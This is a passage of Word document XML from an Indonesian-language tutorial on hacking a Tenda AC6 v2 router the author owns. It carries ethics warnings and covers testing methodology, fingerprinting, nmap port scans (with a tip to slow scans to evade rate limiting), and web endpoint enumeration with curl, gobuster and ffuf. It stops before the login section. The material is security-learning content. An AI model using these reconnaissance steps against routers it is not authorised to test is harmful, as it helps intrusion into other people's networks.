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rPr>
          <w:b/>
          <w:color w:val="888888"/>
          <w:sz w:val="44"/>
        </w:rPr>
        <w:t>BAGIAN I</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0B3D91"/>
          <w:sz w:val="52"/>
        </w:rPr>
        <w:t>Belajar Hardware, Firmware &amp; IoT Hacking</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/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Jenis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 pembelajaran bertahap (hands-on)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latihan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Router Tenda AC6 v2 milik sendiri (lab pribadi)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V15.03.06.51_multi (build-tag ac6v2_rtl_V2.0.0.0(8509)_cn)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Mesin uji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Parrot Linux VM (192.168.0.100), alat: nmap, curl, binwalk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Alat menyusul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Raspberry Pi, CH341A, USB-TTL, SOIC clip, multimeter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Tanggal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2026-10-01</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="C00000"/>
        </w:rPr>
        <w:t>ETIKA: semua teknik di buku ini hanya untuk perangkat MILIK SENDIRI / lab berizin. Menguji perangkat orang lain tanpa izin tertulis = melanggar hukum.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Bagian ini membangun fondasi langkah demi langkah — konsep hardware, firmware, dan IoT; metodologi pengujian; anatomi router; hingga pola kerentanan umum — memakai perangkat yang sama sebagai studi kasus.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Cara Memakai Buku Ini</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>0.1 Untuk siapa &amp; tujuannya</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Buku ini mengajak Anda </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>belajar dengan tangan sendiri</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">. Setiap bab menekankan tiga hal: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>(1) apa yang dilakukan</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>(2) mengapa dilakukan</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">, dan </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>(3) pola/celah apa yang cari</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>. Perangkat Tenda AC6 v2 Anda dipakai sebagai contoh nyata, jadi setiap konsep langsung terhubung ke bukti yang kita kumpulkan.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>0.2 Prasyarat</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Dasar jaringan: IP, subnet, gateway, TCP/UDP, HTTP.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Dasar Linux CLI: cd, ls, grep, pipe, curl, chmod.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Sedikit pemrograman (C lebih baik) untuk memahami overflow/injection.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>0.3 Setup lab yang aman</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Gunakan perangkat milik sendiri atau lab yang diberi izin.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Pisahkan lab di VLAN/SSID terpisah agar tidak mengganggu jaringan penting.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Simpan file bukti di folder khusus (contoh: evidence/).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Selalu mulai dengan aksi read-only; hindari reboot/flash sampai paham risikonya.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>0.4 Aturan emas</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Jangan pernah menguji perangkat/network yang bukan milik Anda tanpa izin tertulis.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> Pengetahuan ini untuk memahami dan memperbaiki, bukan untuk merusak.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>FONDASI</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>1. Hardware vs Firmware vs IoT Hacking</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Istilah-istilah ini sering tertukar. Cara paling mudah: bayangkan </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>lapisan</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> perangkat.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52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20_attack_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Lapisan permukaan serangan sebuah perangkat IoT.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>1.1 Hardware hacking</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Menyentuh perangkat secara </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>fisik</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">: mencari pin UART/JTAG, membaca chip flash (SPI), menyolder, dan sebagainya. Butuh alat: USB-TTL, multimeter, CH341A, clip SOIC-8, hot air. Tujuannya seringkali untuk </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>mendapat shell/console</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> atau </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>mendump firmware</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>1.2 Firmware hacking</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Fokus pada </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>isi perangkat</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>: mengambil firmware, mengekstrak filesystem, membaca binary (httpd, service), mencari kredensial hardcoded, endpoint, dan bug (injeksi/overflow). Bisa dilakukan tanpa alat fisik jika firmware bisa diunduh dari internet.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>1.3 IoT hacking</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Payung besar: menggabungkan hardware + firmware + jaringan + web + radio + cloud. Karena Anda punya Raspberry Pi + CH341A + USB-TTL yang sedang dikirim, Anda akan menyentuh </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>hardware</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> sekaligus </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>firmware</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> — inilah kombinasi yang paling kuat.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>1.4 Alur belajar yang disarankan (sesuai alat Anda)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Sekarang (tanpa alat): firmware &amp; web hacking — download firmware, recon, bug hunting.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Saat alat tiba: UART (lihat bootlog, dapat shell) → SPI dump (punya firmware fisik).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Lanjut: ekstraksi &amp; emulasi firmware (binwalk, FirmAE), analisis Ghidra.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>2. Mindset &amp; Metodologi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89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21_method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Lima tahap metodologi pengujian.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Hacker perangkat tidak 'menebak'. Ia mengikuti urutan yang bisa diulang. Kunci belajar adalah memahami </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>kenapa</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> tiap tahap penting:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>RECON: makin banyak info awal, makin sedikit tebakan. (OUI, header, judul, versi.)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>ENUMERATION: petakan permukaan serangan → port, endpoint, parameter, file.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>VULN ANALYSIS: cocokkan pola (versi vs CVE, coding buruk) dengan potensi celah.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>EXPLOITATION: buktikan dampak. Mulai read-only; catat bukti.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>REPORTING: tanpa laporan yang bisa diulang, temuan tidak bernilai.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Pola pikir penting:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> sebuah 'celah' biasanya lahir dari asumsi developer yang salah — misal 'pengguna hanya akan mengirim input pendek', 'tidak ada yang tahu endpoint ini', 'akun default tidak akan dipakai'. Belajar hacking = belajar menemukan asumsi yang bocor.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3. Anatomi Sebuah Router</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Sebelum menyerang, pahami isinya. Router Tenda AC6 v2 kira-kira terdiri dari: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Lapisan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Contoh di perangkat kita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Bootloader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Kode pertama saat nyala, memuat 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U-Boot (biasanya)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Linux (sering versi lama)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kernel Linux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Rootfs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Filesystem read-only berisi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SquashFS + JFFS2/overlay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Daemon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 yang berjalan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/bin/httpd (web server), upnpd, dll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HTML/JS/CSS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/web (main.html, goform/*, js/*)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Config/NVRAM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Pengaturan tersimpan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nvram, /etc, config partition</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Pelajaran:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> saat kita bicara 'menyerang web admin', sebenarnya kita menyerang </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>sebuah program C (httpd)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> yang membaca input dari jaringan. Memahami ini penting: bug di web = bug di binary C.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>RECON &amp; WEB (STUDI KASUS TENDA)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4. Fingerprinting: Mengenal Target</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Fingerprinting = mengumpulkan identitas target </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>tanpa menyerang</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>. Dimulai dari yang paling murah (satu paket) sampai sedang.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>4.1 OUI / MAC — siapa vendornya?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>ping -c 3 192.168.0.1</w:t>
        <w:br/>
        <w:t>arp -n 192.168.0.1</w:t>
        <w:br/>
        <w:t># -&gt; d8:32:14:5d:5a:80</w:t>
        <w:br/>
        <w:t># 3 byte pertama (d8:32:14) = OUI = Tenda</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Mengapa penting:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> OUI memberi tahu vendor → menentukan model CVE yang mungkin cocok.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>4.2 Header HTTP &amp; judul halaman</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -i http://192.168.0.1/</w:t>
        <w:br/>
        <w:t># HTTP/1.0 302 Redirect</w:t>
        <w:br/>
        <w:t># Server: Http Server</w:t>
        <w:br/>
        <w:t># Location: http://192.168.0.1/main.html</w:t>
        <w:br/>
        <w:br/>
        <w:t>curl -s http://192.168.0.1/login.html | grep -i title</w:t>
        <w:br/>
        <w:t># &lt;title&gt;Tenda Web Master&lt;/title&gt;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`Server: Http Server` generik = sengaja disembunyikan, tapi `Location` &amp; judul membocorkan bahwa ini Tenda.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>4.3 File konfigurasi klien bocor = versi &amp; chipset</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -s http://192.168.0.1/js/macro_config.js</w:t>
        <w:br/>
        <w:t># CONFIG_PRODUCT="ac6v2_rtl"</w:t>
        <w:br/>
        <w:t># CONFIG_CHIP_MODEL="rtl8197F"</w:t>
        <w:br/>
        <w:t># CONFIG_FIRWARE_VERION='ac6v2_rtl_V2.0.0.0(8509)_cn'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file statis (js/config) sering berisi versi build. Di sini kita dapat chipset (RTL8197F) dan versi. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Tapi ingat:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> file statis bisa usang. Verifikasi dengan runtime:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>GET /goform/GetSysStatus  -&gt;  {"firmware":"V15.03.06.51_multi", ...}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Pelajaran penting (akan terulang):</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> JS build-tag bilang 2.0.0.0(8509), runtime bilang 15.03.06.51_multi. Data runtime lebih dipercaya. Pelajaran: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>verifikasi, jangan asumsi.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>5. Port Scanning &amp; Service Enumeration</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Setelah tahu 'siapa', cari 'pintu'-nya: port apa yang terbuka dan service apa yang jalan.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>5.1 Scan cepat vs lengkap</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># cepat (top 1000)</w:t>
        <w:br/>
        <w:t>nmap -sT -T4 192.168.0.1</w:t>
        <w:br/>
        <w:br/>
        <w:t># lengkap semua port TCP</w:t>
        <w:br/>
        <w:t>nmap -Pn -sT -T4 -p- --min-rate 1000 192.168.0.1</w:t>
        <w:br/>
        <w:br/>
        <w:t># deteksi versi service</w:t>
        <w:br/>
        <w:t>nmap -Pn -sV -p 80,5500,9000,10004,52881 192.168.0.1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84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10_re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Hasil live: port terbuka + deteksi service.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>5.2 Membaca hasil &amp; pola</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>80/http = panel admin (permukaan utama kita).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>5500, 9000, 10004, 52881 = non-standar dan tak berdokumentasi → patut dicurigai.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>443 tertutup → tidak ada HTTPS (kredensial lewat cleartext).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>23/telnet &amp; 22/ssh tertutup (bagus), tapi layanan lain bisa jadi jalan masuk.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>5.3 Tanda bahaya khusus</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Port tinggi yang </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>stabil</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (menerima koneksi tapi tak mengirim banner) sering = service kustom pabrik (cloud/app/UPnP). Ini permukaan serangan yang jarang diuji.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Kita juga menemukan fenomena menarik:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> setelah melakukan banyak koneksi cepat, port 80 sempat 'diblokir' ~30 detik lalu pulih. Itu tanda </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>rate-limit/anti-scan</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>. Pelajaran: perangkat bisa punya proteksi DoS sendiri; scan pelan (`-T2`) untuk menghindarinya.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>6. Web Enumeration: Menemukan Endpoint &amp; Kebocoran</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Ini inti web hacking: menemukan semua 'pintu' di aplikasi web. Ada dua cara: baca JS dan/atau brute-force path.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>6.1 Baca source dulu (gratis &amp; akurat)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -s http://192.168.0.1/js/main.js  -o main.js</w:t>
        <w:br/>
        <w:t>curl -s http://192.168.0.1/js/index.js -o index.js</w:t>
        <w:br/>
        <w:t># ekstrak endpoint</w:t>
        <w:br/>
        <w:t>grep -oE 'goform/[A-Za-z0-9_]+' main.js index.js | sort -u</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Mengapa ini emas:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> aplikasi modern 'memberi tahu' endpoint-nya lewat JavaScript. Jika file JS bisa diakses tanpa login, penyerang mendapat </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>peta lengkap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Pola Tenda:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> backend memakai skema `goform/&lt;NamaForm&gt;` (Get/Set). Dari JS kita dapat 41 endpoint: `WifiBasicGet`, `SetFirewallCfg`, `SetSysTimeCfg`, dll. Nama 'Get'/'Set' langsung memberi tahu mana yang membaca dan mana yang mengubah pengaturan.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>6.2 Brute-force path (jika source tidak membantu)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>gobuster dir -u http://192.168.0.1 -w /usr/share/wordlists/dirb/common.txt</w:t>
        <w:br/>
        <w:t>ffuf -u http://192.168.0.1/FUZZ -w wordlist.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>6.3 Kebocoran file statis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Halaman seperti `main.html` dilindungi (redirect ke login), </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>tapi</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> `js/*.js`, `js/macro_config.js`, `js/login.js` justru terbuka. Inilah </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Information Disclosure</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> — kebocoran informasi yang jadi pondasi serangan berikutnya.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55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2_wireless_ss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4. Halaman WiFi Settings asli (UI live via sesi bypass).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>7. Autentikasi &amp; Session</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Sebelum bisa bicara soal bypass, pahami dulu </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>bagaimana normalnya login bekerja</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>. Tenda memakai skema cookie.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>7.1 Alur login normal</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
